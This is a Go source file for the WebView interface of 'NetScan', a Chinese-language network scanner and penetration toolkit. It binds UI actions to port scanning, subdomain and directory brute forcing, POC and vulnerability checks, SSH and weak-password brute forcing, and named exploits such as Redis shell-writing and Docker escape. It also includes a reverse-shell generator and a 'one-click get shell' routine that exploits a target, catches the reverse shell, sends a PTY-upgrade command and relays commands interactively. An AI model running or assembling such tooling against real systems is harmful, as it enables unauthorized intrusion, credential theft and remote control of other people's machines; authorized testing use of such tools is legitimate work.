package webgui

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/webview/webview_go"
	"portscanner/internal/ffufrun"
	"portscanner/internal/scanner"
)

//go:embed index.html
var indexHTML string

// scanRequest 前端传来的扫描配置
type scanRequest struct {
	Targets       []string `json:"targets"`
	Ports         string   `json:"ports"`
	ExcludePorts  string   `json:"exclude_ports"`
	ScanTypes     []string `json:"scan_types"`
	Timing        int      `json:"timing"`
	SkipDiscovery bool     `json:"skip_discovery"`
	DiscoveryOnly bool     `json:"discovery_only"`
	ServiceDetect bool     `json:"service_detect"`
	VersionDetect bool     `json:"version_detect"`
	OSDetect      bool     `json:"os_detect"`
	ResolveDNS    bool     `json:"resolve_dns"`
	POC           bool     `json:"poc"`
	Fingerprint   bool     `json:"fingerprint"`
	Banner        bool     `json:"banner"`
	StopAfter     bool     `json:"stop_after"`
	Proxy         string   `json:"proxy"`
	Rate          int      `json:"rate"`
	SortBy        string   `json:"sort_by"`
	DirSearch     bool     `json:"dir_search"`
	WebCheck      bool     `json:"web_check"`
	SubBrute      bool     `json:"sub_brute"`
	SubDepth      int      `json:"sub_depth"`
	Whois         bool     `json:"whois"`
	DNSRecords    bool     `json:"dns_records"`
	UseHTTPS      bool     `json:"use_https"`
	Randomize     bool     `json:"randomize"`
	ForceRaw      bool     `json:"force_raw"`
	Verbose       bool     `json:"verbose"`
	MaxTargets    int      `json:"max_targets"`
}

// Run 启动基于 WebView 的图形界面
func Run() {
	// 加载用户自定义模块(modules/ 目录)
	scanner.OpenModuleManager("").Load()

	w := webview.New(false)
	defer w.Destroy()
	w.SetTitle("NetScan 网络扫描器")
	w.SetSize(1280, 900, webview.HintNone)

	var mu sync.Mutex
	var current *scanner.Scanner
	var scanRunning bool
	var resultMu sync.Mutex
	var collected []scanner.Result
	var lastTarget, lastPorts string

	// UI 更新器: 收集 JS 片段, 由单一 goroutine 批量刷入,
	// 避免多 goroutine 并发调用 Dispatch/Eval 触发 webview 崩溃
	var uiMu sync.Mutex
	var pending []string
	dispatchJS := func(js string) {
		uiMu.Lock()
		pending = append(pending, js)
		uiMu.Unlock()
	}
	recon := func(line string) {
		dispatchJS("window.addRecon(" + strconv.Quote(line) + ")")
		dispatchJS("window.addScanLog(" + strconv.Quote(line) + ")")
	}
	recon2 := func(line string) {
		dispatchJS("window.addExploitRecon(" + strconv.Quote(line) + ")")
	}
	fuzzOut := func(line string) {
		dispatchJS("window.addFuzzOut(" + strconv.Quote(line) + ")")
	}
	// 交互式 shell 会话(纯 GUI 内嵌终端)
	var shellMu sync.Mutex
	var shellConn net.Conn
	shellOut := func(line string) {
		dispatchJS("window.addShellOut(" + strconv.Quote(line) + ")")
	}
	go func() {
		t := time.NewTicker(50 * time.Millisecond)
		defer t.Stop()
		for range t.C {
			uiMu.Lock()
			batch := pending
			pending = nil
			uiMu.Unlock()
			if len(batch) == 0 {
				continue
			}
			w.Dispatch(func() {
				for _, js := range batch {
					w.Eval(js)
				}
			})
		}
	}()

	w.Bind("startScan", func(optsJSON string) error {
		req := scanRequest{}
		if err := json.Unmarshal([]byte(optsJSON), &req); err != nil {
			return err
		}
		opts := buildOptions(req)

		if req.POC {
			dispatchJS(`window.onProgress({"Message":"POC 已启用: 端口扫描完成后对开放端口全量检测(结果写入扫描日志并标注)"})`)
		}
		dispatchJS("window.clearScanLog()")

		mu.Lock()
		if scanRunning {
			mu.Unlock()
			return fmt.Errorf("已有扫描任务运行中, 请等待完成或先停止")
		}
		scanRunning = true
		mu.Unlock()

		resultMu.Lock()
		collected = nil
		lastTarget = strings.Join(req.Targets, ",")
		lastPorts = req.Ports
		resultMu.Unlock()

		s := scanner.NewScanner(opts,
			func(r scanner.Result) {
				resultMu.Lock()
				collected = append(collected, r)
				resultMu.Unlock()
				b, _ := json.Marshal(r)
				dispatchJS("window.addResult(" + string(b) + ")")
			},
			func(p scanner.Progress) {
				b, _ := json.Marshal(p)
				dispatchJS("window.onProgress(" + string(b) + ")")
			},
		)
		mu.Lock()
		current = s
		mu.Unlock()

		go func() {
			defer func() {
				mu.Lock()
				scanRunning = false
				mu.Unlock()
			}()
			defer func() {
				if r := recover(); r != nil {
					dispatchJS("window.onScanDone(" + strconv.Quote(fmt.Sprintf("扫描异常: %v", r)) + ")")
				}
			}()
			runErr := s.Run()
			if req.POC {
				resultMu.Lock()
				rs := make([]scanner.Result, len(collected))
				copy(rs, collected)
				resultMu.Unlock()
				dispatchJS("window.addScanLog(" + strconv.Quote("========== POC 检测开始(全量模板) ==========") + ")")
				total := 0
				for i := range rs {
					r := rs[i]
					if r.State != scanner.StateOpen || r.Protocol != "tcp" {
						continue
					}
					dispatchJS("window.addScanLog(" + strconv.Quote(fmt.Sprintf("[POC] 检查 %s:%d ...", r.IP, r.Port)) + ")")
					hits := scanner.ScanPOCs(r.IP, r.Port, 3*time.Second)
					if len(hits) == 0 {
						continue
					}
					ids := make([]string, 0, len(hits))
					for _, h := range hits {
						total++
						dispatchJS("window.addScanLog(" + strconv.Quote(fmt.Sprintf("[命中] %s:%d %s | 复现: %s", r.IP, r.Port, h.Name, h.Steps)) + ")")
						if f := strings.Fields(h.Name); len(f) > 0 {
							ids = append(ids, f[0])
						}
					}
					if len(ids) > 0 {
						vuln := strings.Join(ids, ", ")
						resultMu.Lock()
						if i < len(collected) {
							collected[i].Vuln = vuln
						}
						resultMu.Unlock()
						dispatchJS(fmt.Sprintf("window.markVuln(%s, %d, %s)", strconv.Quote(r.IP), r.Port, strconv.Quote(vuln)))
					}
				}
				dispatchJS("window.addScanLog(" + strconv.Quote(fmt.Sprintf("========== POC 检测完成: %d 个命中 ==========", total)) + ")")
			}
			if runErr != nil {
				dispatchJS("window.onScanDone(" + strconv.Quote("扫描出错: "+runErr.Error()) + ")")
			} else {
				dispatchJS(`window.onScanDone("扫描完成")`)
			}

			// Banner 抓取
			if req.Banner {
				resultMu.Lock()
				rs := make([]scanner.Result, len(collected))
				copy(rs, collected)
				resultMu.Unlock()
				recon("========== Banner 抓取 ==========")
				for _, r := range rs {
					if r.State != scanner.StateOpen || r.Protocol != "tcp" {
						continue
					}
					b := scanner.GrabBanner(r.IP, r.Port, 2*time.Second)
					if b != "" {
						recon(fmt.Sprintf("[%s:%d %s]\n%s", r.IP, r.Port, r.Service, strings.TrimSpace(b)))
					}
				}
				recon("========== Banner 完成 ==========")
			}

			// 插件: notification 推送 / report 生成报告 / output 自定义输出
			resultMu.Lock()
			rs := make([]scanner.Result, len(collected))
			copy(rs, collected)
			target := lastTarget
			ports := lastPorts
			resultMu.Unlock()
			pm := scanner.OpenPluginManager("")
			pm.Notify(rs)
			for _, path := range pm.GenerateReports(target, ports, rs) {
				recon("插件报告已生成: " + path)
			}
			for name, text := range pm.RenderOutput(rs) {
				recon("===== 插件输出: " + name + " =====\n" + text)
			}
		}()

		// Web 侦察
		if req.DirSearch || req.WebCheck || req.SubBrute || req.Whois || req.DNSRecords {
			go runRecon(req, recon)
		}
		return nil
	})

	// 独立 Web 侦察(子域名爆破/目录爆破/Whois/DNS 等, 无需先做端口扫描)
	w.Bind("reconStart", func(optsJSON string) error {
		req := scanRequest{}
		if err := json.Unmarshal([]byte(optsJSON), &req); err != nil {
			return err
		}
		if len(req.Targets) == 0 {
			return fmt.Errorf("请先在「扫描目标」输入框填写目标")
		}
		if !(req.DirSearch || req.WebCheck || req.SubBrute || req.Whois || req.DNSRecords) {
			return fmt.Errorf("请至少勾选一项侦察功能")
		}
		if req.Ports == "" || req.Ports == "1-65535" {
			req.Ports = "80"
		}
		go runRecon(req, recon)
		return nil
	})

	w.Bind("stopScan", func() {
		mu.Lock()
		s := current
		mu.Unlock()
		if s != nil {
			s.Stop()
		}
	})

	// 路由跟踪
	w.Bind("traceroute", func(target string) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon("无法解析 " + target)
				return
			}
			recon("========== 路由跟踪 " + target + " (" + ip + ") ==========")
			scanner.TraceRoute(ip, 30, time.Second, func(hop int, addr string, rtt time.Duration) {
				if addr == "*" {
					recon(fmt.Sprintf("%3d  *", hop))
				} else {
					recon(fmt.Sprintf("%3d  %-16s %v", hop, addr, rtt.Round(time.Millisecond)))
				}
			})
			recon("========== 路由跟踪完成 ==========")
		}()
		return nil
	})

	// Ping
	w.Bind("pingTarget", func(target string) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon("无法解析 " + target)
				return
			}
			rtt, ok := scanner.Ping(ip, time.Second)
			if ok {
				recon(fmt.Sprintf("%s (%s) 存活 延迟 %v", target, ip, rtt.Round(time.Millisecond)))
			} else {
				recon(fmt.Sprintf("%s (%s) 不可达", target, ip))
			}
		}()
		return nil
	})

	// 导出 HTML 报告
	w.Bind("exportHTML", func(name string) (string, error) {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		target := lastTarget
		ports := lastPorts
		resultMu.Unlock()
		dir := downloadDir()
		path := filepath.Join(dir, name)
		if err := scanner.WriteHTMLReport(path, target, ports, rs); err != nil {
			return "", err
		}
		return path, nil
	})

	// 反弹 shell 生成
	w.Bind("shellGen", func(shellType, lhost string, lport int) string {
		return scanner.ReverseShell(shellType, lhost, lport)
	})

	// 漏洞报告
	w.Bind("vulnReport", func() string {
		return scanner.VulnReport()
	})

	// 一键拿 shell: 检测未授权→写反弹 shell→监听→内嵌终端交互
	w.Bind("getShell", func(target, lhost string, lport, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				shellOut("无法解析 " + target + "\n")
				return
			}
			if lhost == "" {
				shellOut("请填写回连地址(lhost)\n")
				return
			}
			if port <= 0 {
				port = 6379
			}
			ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", lport))
			if err != nil {
				shellOut("监听失败: " + err.Error() + "\n")
				return
			}
			defer ln.Close()
			shellOut(fmt.Sprintf("========== 一键拿 shell %s:%d (监听 %d) ==========\n", ip, port, lport))

			result := scanner.GetShell(ip, port, lhost, lport, 5*time.Second)
			shellOut(result + "\n")
			if strings.HasPrefix(result, "目标") || strings.HasPrefix(result, "写入失败") || strings.HasPrefix(result, "连接失败") || strings.HasPrefix(result, "端口") || strings.HasPrefix(result, "检测未命中") || strings.HasPrefix(result, "不可") {
				shellOut("========== 拿 shell 失败 ==========\n")
				return
			}

			ln.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
			conn, err := ln.Accept()
			if err != nil {
				shellOut("60 秒内未收到 shell 连接\n")
				return
			}

			// 关闭旧会话, 保存新连接
			shellMu.Lock()
			if shellConn != nil {
				_ = shellConn.Close()
			}
			shellConn = conn
			shellMu.Unlock()

			shellOut("[+] 收到反弹 shell: " + conn.RemoteAddr().String() + "\n")
			// 自动升级 PTY: 让远端 bash 获得 job control, 可运行 vim/top/sudo 等
			_, _ = conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n"))

			// 持续读取 shell 输出推送到内嵌终端
			buf := make([]byte, 4096)
			for {
				n, err := conn.Read(buf)
				if n > 0 {
					shellOut(string(buf[:n]))
				}
				if err != nil {
					break
				}
			}
			shellOut("\n[*] shell 已断开\n")
			shellMu.Lock()
			if shellConn == conn {
				shellConn = nil
			}
			shellMu.Unlock()
			_ = conn.Close()
		}()
		return nil
	})

	// 交互式 shell: 发送命令 / 断开连接
	w.Bind("shellInput", func(cmd string) {
		shellMu.Lock()
		c := shellConn
		shellMu.Unlock()
		if c == nil {
			shellOut("未连接 shell\n")
			return
		}
		_, _ = c.Write([]byte(cmd + "\n"))
	})
	w.Bind("shellClose", func() {
		shellMu.Lock()
		c := shellConn
		shellConn = nil
		shellMu.Unlock()
		if c != nil {
			_ = c.Close()
		}
	})

	// 扫描目标所有漏洞(仅命中)
	w.Bind("scanVuln", func(target string, port int) error {
		go func() {
			vulnOut := func(line string) {
				dispatchJS("window.addVulnScanOut(" + strconv.Quote(line) + ")")
			}
			dispatchJS("window.clearVulnScanOut()")
			ip, err := resolveHost(target)
			if err != nil {
				vulnOut("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			vulnOut(fmt.Sprintf("========== 扫描漏洞 %s:%d ==========", ip, port))
			hits := scanner.ScanVulns(ip, port, 3*time.Second)
			if len(hits) == 0 {
				vulnOut("未发现漏洞")
			} else {
				vulnOut(fmt.Sprintf("命中 %d 个漏洞:", len(hits)))
				for _, h := range hits {
					vulnOut(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
				}
			}
			vulnOut("========== 漏洞扫描完成 ==========")
		}()
		return nil
	})

	// 扫描 Web POC 模板
	w.Bind("pocScan", func(target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			recon2(fmt.Sprintf("========== 扫描 Web POC %s:%d ==========", ip, port))
			hits := scanner.ScanPOCs(ip, port, 3*time.Second)
			if len(hits) == 0 {
				recon2("未命中任何 POC")
			} else {
				recon2(fmt.Sprintf("命中 %d 个 POC:", len(hits)))
				for _, h := range hits {
					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
				}
			}
			recon2("========== POC 扫描完成 ==========")
		}()
		return nil
	})

	// SSH 爆破 + 弹交互式命令行窗口
	w.Bind("sshShell", func(target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 22
			}
			recon2(fmt.Sprintf("========== SSH 爆破 %s:%d ==========", ip, port))
			user, pass, ok := scanner.BruteSSHOnce(ip, port, nil, nil, 10, 3*time.Second)
			if !ok {
				recon2("爆破失败, 未找到凭据")
				return
			}
			recon2(fmt.Sprintf("[成功] %s:%d  用户:%s 密码:%s", ip, port, user, pass))
			// 弹新命令行窗口运行交互式 SSH(跨平台)
			exe, _ := os.Executable()
			if err := runInTerminal(exe, []string{
				"--ssh-connect", "-target", ip, "-p", strconv.Itoa(port),
				"--ssh-user", user, "--ssh-pass", pass,
			}); err != nil {
				recon2("弹出命令行失败: " + err.Error())
				return
			}
			recon2("已弹出交互式 SSH 命令行窗口")
		}()
		return nil
	})

	// 弱口令爆破
	w.Bind("brute", func(target string, port int, service string, threads, delay int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = defaultPort(service)
			}
			recon2(fmt.Sprintf("========== 爆破 %s %s:%d ==========", service, ip, port))
			scanner.BruteForce(ip, port, service, nil, nil, threads, time.Duration(delay)*time.Millisecond, 3*time.Second, func(r scanner.BruteResult) {
				recon2(fmt.Sprintf("[成功] %s://%s:%d  用户:%s 密码:%s", r.Service, ip, port, r.Username, r.Password))
			})
			recon2("========== 爆破完成 ==========")
		}()
		return nil
	})

	// 漏洞利用
	w.Bind("exploit", func(name, target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = defaultPort(name)
			}
			recon2(fmt.Sprintf("========== 利用 %s %s:%d ==========", name, ip, port))
			if name == "auto" {
				recon2(scanner.AutoExploit(ip, port, "", 5*time.Second))
			} else {
				recon2(scanner.RunExploit(name, ip, port, 5*time.Second))
			}
			recon2("========== 利用完成 ==========")
		}()
		return nil
	})

	// 查看资产历史
	w.Bind("history", func(target string) string {
		s := scanner.OpenStore(scanner.DefaultStateDir())
		recs, err := s.History(target)
		if err != nil {
			return "无历史记录"
		}
		var sb strings.Builder
		for _, rec := range recs {
			sb.WriteString("=== " + rec.Target + " (" + rec.Time.Format("2006-01-02 15:04:05") + ") ===\n")
			for _, a := range rec.Assets {
				sb.WriteString(fmt.Sprintf("  %s:%-5d/%-3s %s\n", a.IP, a.Port, a.Protocol, a.Service))
			}
		}
		return sb.String()
	})

	// 保存到资产库
	w.Bind("storeScan", func(target string) string {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		resultMu.Unlock()
		s := scanner.OpenStore(scanner.DefaultStateDir())
		if err := s.Save(target, rs); err != nil {
			return "保存失败: " + err.Error()
		}
		return "已保存到资产库"
	})

	// ---- 插件管理 ----
	pm := scanner.OpenPluginManager(scanner.DefaultPluginDir())
	w.Bind("getPlugins", func() (string, error) {
		b, _ := json.Marshal(pm.List())
		return string(b), nil
	})
	w.Bind("getMarketPlugins", func() (string, error) {
		b, _ := json.Marshal(scanner.MarketplacePlugins())
		return string(b), nil
	})
	w.Bind("installMarketPlugin", func(id string) error {
		return scanner.InstallMarketPlugin(id)
	})
	w.Bind("installFilePlugin", func(path string) error {
		return pm.Install(path)
	})
	w.Bind("enablePlugin", func(id string) error { return pm.Enable(id) })
	w.Bind("disablePlugin", func(id string) error { return pm.Disable(id) })
	w.Bind("uninstallPlugin", func(id string) error { return pm.Remove(id) })
	w.Bind("updatePlugin", func(id string) error { return scanner.InstallMarketPlugin(id) })

	// ---- 高级工具(GUI 全功能集成) ----

	// POC 扫描(定向过滤 --poc-id + OAST 回调 --oast)
	w.Bind("pocScanEx", func(target string, port int, filter, oast string) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			if oast != "" {
				if err := scanner.StartOAST(oast); err != nil {
					recon2("OAST 启动失败: " + err.Error())
				} else {
					recon2("OAST 回调已启用: " + oast)
				}
			}
			recon2(fmt.Sprintf("========== 扫描 Web POC %s:%d ==========", ip, port))
			if filter != "" {
				recon2("POC 过滤: " + filter)
			}
			var hits []scanner.VulnHit
			if filter != "" {
				hits = scanner.ScanPOCsFiltered(ip, port, 3*time.Second, filter)
			} else {
				hits = scanner.ScanPOCs(ip, port, 3*time.Second)
			}
			if len(hits) == 0 {
				recon2("未命中任何 POC")
			} else {
				recon2(fmt.Sprintf("命中 %d 个 POC:", len(hits)))
				for _, h := range hits {
					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
				}
			}
			recon2("========== POC 扫描完成 ==========")
		}()
		return nil
	})

	// 利用模块全列表
	w.Bind("exploitList", func() string {
		return strings.Join(scanner.ExploitList(), "\n")
	})

	// SSH 直连(已知凭据, 弹交互式命令行)
	w.Bind("sshConnectTerm", func(target string, port int, user, pass string) error {
		ip, err := resolveHost(target)
		if err != nil {
			return err
		}
		if port <= 0 {
			port = 22
		}
		exe, _ := os.Executable()
		return runInTerminal(exe, []string{
			"--ssh-connect", "-target", ip, "-p", strconv.Itoa(port),
			"--ssh-user", user, "--ssh-pass", pass,
		})
	})

	// 结果导出(html/json/csv/grep/xml/normal)
	w.Bind("exportData", func(format, name string) (string, error) {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		target := lastTarget
		ports := lastPorts
		resultMu.Unlock()
		if strings.TrimSpace(name) == "" {
			name = "netscan-export"
		}
		name = filepath.Base(strings.TrimSpace(name))
		dir := downloadDir()
		switch strings.ToLower(format) {
		case "html":
			fp := filepath.Join(dir, name+".html")
			return fp, scanner.WriteHTMLReport(fp, target, ports, rs)
		case "json":
			b, _ := json.MarshalIndent(rs, "", "  ")
			fp := filepath.Join(dir, name+".json")
			return fp, os.WriteFile(fp, b, 0o644)
		case "csv":
			var sb strings.Builder
			sb.WriteString("ip,port,protocol,state,service,version,vuln\n")
			for _, r := range rs {
				sb.WriteString(fmt.Sprintf("%s,%d,%s,%s,%s,%s,%s\n", r.IP, r.Port, r.Protocol,
					r.State, csvCell(r.Service), csvCell(r.Version), csvCell(r.Vuln)))
			}
			fp := filepath.Join(dir, name+".csv")
			return fp, os.WriteFile(fp, []byte(sb.String()), 0o644)
		case "grep":
			var sb strings.Builder
			for _, r := range rs {
				if r.State == scanner.StateOpen {
					sb.WriteString(fmt.Sprintf("%s:%d/open/%s\n", r.IP, r.Port, r.Protocol))
				}
			}
			fp := filepath.Join(dir, name+".grep")
			return fp, os.WriteFile(fp, []byte(sb.String()), 0o644)
		case "xml":
			var sb strings.Builder
			sb.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<netscan>\n")
			for _, r := range rs {
				sb.WriteString(fmt.Sprintf("  <host ip=%q port=%q protocol=%q state=%q service=%q version=%q/>\n",
					xmlEsc(r.IP), strconv.Itoa(r.Port), xmlEsc(r.Protocol), xmlEsc(string(r.State)),
					xmlEsc(r.Service), xmlEsc(r.Version)))
			}
			sb.WriteString("</netscan>\n")
			fp := filepath.Join(dir, name+".xml")
			return fp, os.WriteFile(fp, []byte(sb.String()), 0o644)
		default:
			var sb strings.Builder
			for _, r := range rs {
				sb.WriteString(fmt.Sprintf("%-20s %5d/%-3s %-12s %-16s %s\n", r.IP, r.Port,
					r.Protocol, string(r.State), r.Service, r.Version))
			}
			fp := filepath.Join(dir, name+".txt")
			return fp, os.WriteFile(fp, []byte(sb.String()), 0o644)
		}
	})

	// 资产对比: 与上次状态比对并保存当前状态
	w.Bind("diffState", func(target string) string {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		resultMu.Unlock()
		var items []string
		for _, r := range rs {
			if r.State == "up" {
				items = append(items, r.IP)
			}
			if r.State == scanner.StateOpen {
				items = append(items, fmt.Sprintf("%s:%d/%s", r.IP, r.Port, r.Protocol))
			}
		}
		added, removed, err := scanner.DiffState(scanner.DefaultStateDir(), target, items)
		if err != nil {
			return "对比失败: " + err.Error()
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("与上次对比 %s: 新增 %d, 消失 %d (已保存当前状态)\n", target, len(added), len(removed)))
		for _, x := range added {
			sb.WriteString("  + " + x + "\n")
		}
		for _, x := range removed {
			sb.WriteString("  - " + x + "\n")
		}
		return sb.String()
	})

	// 资源管理器: POC / 模块 / 字典 / Shell 链
	w.Bind("pocList", func() string {
		b, _ := json.Marshal(scanner.OpenPOCManager("").List())
		return string(b)
	})
	w.Bind("pocBuiltinList", func(filter string) string {
		b, _ := json.Marshal(scanner.POCBuiltinList(filter, 300))
		return string(b)
	})
	w.Bind("pocBatch", func(target string, port int, filter string, count int) error {
		go func() {
			out := func(line string) {
				dispatchJS("window.addPocBatchOut(" + strconv.Quote(line) + ")")
			}
			ip, err := resolveHost(target)
			if err != nil {
				out("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			start := time.Now()
			out(fmt.Sprintf("===== 批量 POC %s:%d 数量=%d 过滤=%q =====", ip, port, count, filter))
			hits := scanner.ScanPOCsFilteredLimit(ip, port, 3*time.Second, filter, count)
			for _, h := range hits {
				out("● " + h.Name + " | 复现: " + h.Steps)
			}
			out(fmt.Sprintf("===== 完成: %d 条命中, 用时 %s =====", len(hits), time.Since(start).Round(time.Second)))
		}()
		return nil
	})
	w.Bind("pocAdd", func(path string) error { return scanner.OpenPOCManager("").Add(path) })
	w.Bind("pocRemove", func(id string) error { return scanner.OpenPOCManager("").Remove(id) })
	w.Bind("moduleList", func() string {
		b, _ := json.Marshal(scanner.OpenModuleManager("").List())
		return string(b)
	})
	w.Bind("moduleAdd", func(path string) error {
		m := scanner.OpenModuleManager("")
		if err := m.Add(path); err != nil {
			return err
		}
		m.Load()
		return nil
	})
	w.Bind("moduleRemove", func(id string) error { return scanner.OpenModuleManager("").Remove(id) })
	w.Bind("dictList", func() string {
		b, _ := json.Marshal(scanner.OpenDictManager("").List())
		return string(b)
	})
	w.Bind("dictAdd", func(path string) error { return scanner.OpenDictManager("").Add(path) })
	w.Bind("shellList", func() string {
		b, _ := json.Marshal(scanner.OpenShellChainManager("").List())
		return string(b)
	})
	w.Bind("shellAdd", func(path string) error { return scanner.OpenShellChainManager("").Add(path) })
	w.Bind("shellRemove", func(id string) error { return scanner.OpenShellChainManager("").Remove(id) })

	// 插件市场地址
	w.Bind("setMarket", func(u string) {
		scanner.SetMarketURL(strings.TrimRight(u, "/"))
	})

	// ffuf 模糊测试
	var fuzzMu sync.Mutex
	var fuzzRunner *ffufrun.Runner
	w.Bind("fuzzStart", func(cfgJSON string) error {
		cfg := ffufrun.Config{}
		if err := json.Unmarshal([]byte(cfgJSON), &cfg); err != nil {
			return err
		}
		mode := strings.ToLower(cfg.Mode)
		if mode == "subdomain" || mode == "sub" {
			if cfg.Subdomain == "" {
				return fmt.Errorf("子域名模式需要填写根域名")
			}
		} else if mode == "vhost" {
			if cfg.VHost == "" || cfg.URL == "" {
				return fmt.Errorf("虚拟主机模式需要填写域名与目标 URL")
			}
		} else if !strings.Contains(cfg.URL, "FUZZ") && cfg.Request == "" {
			return fmt.Errorf("URL 必须包含 FUZZ 关键字")
		}
		if cfg.Wordlist == "" && len(cfg.Wordlists) == 0 && cfg.Request == "" && len(cfg.InputCommands) == 0 {
			words := scanner.DefaultDirWordlist()
			p := filepath.Join(os.TempDir(), "netscan_fuzz_wordlist.txt")
			if err := os.WriteFile(p, []byte(strings.Join(words, "\n")+"\n"), 0o600); err != nil {
				return fmt.Errorf("写入内置字典失败: %w", err)
			}
			cfg.Wordlists = append(cfg.Wordlists, p)
		}
		fuzzMu.Lock()
		old := fuzzRunner
		fuzzMu.Unlock()
		if old != nil {
			old.Stop()
			old.Wait()
		}
		r, err := ffufrun.Run(cfg, fuzzOut)
		if err != nil {
			return err
		}
		fuzzMu.Lock()
		fuzzRunner = r
		fuzzMu.Unlock()
		go func() {
			r.Wait()
			fuzzOut("========== fuzz 完成 ==========")
			fuzzMu.Lock()
			if fuzzRunner == r {
				fuzzRunner = nil
			}
			fuzzMu.Unlock()
		}()
		return nil
	})
	w.Bind("fuzzStop", func() {
		fuzzMu.Lock()
		r := fuzzRunner
		fuzzMu.Unlock()
		if r != nil {
			r.Stop()
		}
	})

	w.SetHtml(indexHTML)
	w.Run()
}

// defaultPort 根据服务/模块名返回默认端口
func defaultPort(name string) int {
	switch strings.ToLower(name) {
	case "ftp":
		return 21
	case "ssh":
		return 22
	case "telnet":
		return 23
	case "smtp":
		return 25
	case "mysql":
		return 3306
	case "postgresql":
		return 5432
	case "redis", "redis-write-shell":
		return 6379
	case "docker", "docker-escape":
		return 2375
	case "elasticsearch", "es-file-read":
		return 9200
	case "nacos", "nacos-register":
		return 8848
	case "jenkins", "jenkins-script":
		return 8080
	case "tomcat", "tomcat-war":
		return 8080
	}
	return 80
}

func buildOptions(req scanRequest) scanner.Options {
	opts := scanner.DefaultOptions()
	opts.Targets = req.Targets
	opts.Ports = req.Ports
	opts.ExcludePorts = req.ExcludePorts
	opts.Timing = req.Timing
	opts.Timeout = 0
	opts.Concurrency = 0
	opts.SkipDiscovery = req.SkipDiscovery
	opts.DiscoveryOnly = req.DiscoveryOnly
	opts.ServiceDetect = req.ServiceDetect
	opts.VersionDetect = req.VersionDetect
	opts.OSDetect = req.OSDetect
	opts.ResolveDNS = req.ResolveDNS
	opts.POC = false // GUI 在端口扫描完成后执行 POC 全量检测(实时写入扫描日志并标注行)
	opts.Fingerprint = req.Fingerprint
	opts.StopAfterHost = req.StopAfter
	opts.ProxyURL = req.Proxy
	opts.Rate = req.Rate
	opts.Randomize = req.Randomize
	opts.Verbose = req.Verbose
	opts.ForceRaw = req.ForceRaw
	if req.MaxTargets > 0 {
		opts.MaxTargets = req.MaxTargets
	}

	var types []scanner.ScanType
	for _, t := range req.ScanTypes {
		types = append(types, scanner.ScanType(t))
	}
	if len(types) > 0 {
		opts.ScanTypes = types
	}
	return opts
}

// runRecon 执行 Web 侦察功能, 结果逐行推送到前端
func runRecon(req scanRequest, push func(string)) {
	if len(req.Targets) == 0 {
		return
	}
	host := stripScheme(req.Targets[0])
	domain := strings.SplitN(host, "/", 2)[0]
	port := firstPort(req.Ports, 80)
	timeout := 3 * time.Second

	if req.DirSearch {
		push(fmt.Sprintf("========== 目录爆破 %s:%d ==========", domain, port))
		scanner.DirSearch(domain, port, req.UseHTTPS, 30, timeout, func(path string, status int, size int64) {
			push(fmt.Sprintf("%-40s [%d] %d字节", path, status, size))
		})
	}

	if req.WebCheck {
		push(fmt.Sprintf("========== Web 头检查 %s:%d ==========", domain, port))
		headers, issues := scanner.WebHeaderCheck(domain, port, req.UseHTTPS, timeout)
		if headers == nil {
			push("无法连接到目标 Web 服务")
		} else {
			push("--- 响应头 ---")
			for k, v := range headers {
				push(fmt.Sprintf("  %s: %s", k, v))
			}
			if len(issues) > 0 {
				push("--- 安全问题 ---")
				for _, issue := range issues {
					push(fmt.Sprintf("  [%s] %s", issue.Level, issue.Message))
				}
			}
		}
	}

	if req.SubBrute {
		depth := req.SubDepth
		if depth < 1 {
			depth = 1
		}
		push(fmt.Sprintf("========== 子域名爆破 %s (深度 %d) ==========", domain, depth))
		scanner.SubdomainBrute(domain, depth, 50, timeout, func(sub, ip string) {
			push(fmt.Sprintf("%-40s -> %s", sub, ip))
		})
	}

	if req.Whois {
		push(fmt.Sprintf("========== Whois %s ==========", domain))
		info, err := scanner.Whois(domain, 5*time.Second)
		if err != nil {
			push("Whois 失败: " + err.Error())
		} else {
			for _, line := range strings.Split(info, "\n") {
				push(strings.TrimRight(line, "\r"))
			}
		}
	}

	if req.DNSRecords {
		push(fmt.Sprintf("========== DNS 记录 %s ==========", domain))
		records := scanner.DNSRecords(domain, 5*time.Second)
		order := []string{"A/AAAA", "CNAME", "MX", "NS", "TXT"}
		for _, typ := range order {
			for _, v := range records[typ] {
				push(fmt.Sprintf("%-8s %s", typ, v))
			}
		}
	}

	push("========== 侦察完成 ==========")
}

func resolveHost(s string) (string, error) {
	s = stripScheme(s)
	if ip := net.ParseIP(s); ip != nil {
